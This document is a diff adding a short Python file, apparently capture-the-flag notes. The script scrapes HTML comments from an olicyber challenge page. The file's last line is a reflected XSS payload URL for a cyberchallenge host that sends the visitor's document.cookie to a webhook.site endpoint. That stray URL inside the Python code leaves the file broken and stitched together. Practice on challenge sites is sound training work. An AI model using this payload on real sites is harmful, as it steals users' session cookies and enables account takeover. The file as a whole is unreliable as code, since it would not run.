@@ -1,0 +1,14 @@
+import requests
+from bs4 import BeautifulSoup, Comment
+
+url = 'http://web-14.challs.olicyber.it/'
+response = requests.get(url)
+
+soup = BeautifulSoup(response.content, 'html.parser')
+
+comments = soup.find_all(string=lambda text: isinstance(text, Comment))
+for c in comments:
+    print(c)
+    print("===========")
+    c.extract()
+http://xss1.challs.cyberchallenge.it/?html=<script>fetch('https://webhook.site/f34b524e-0f2d-4b7f-9b1a-d964e06aa142/?c='+document.cookie)</script>
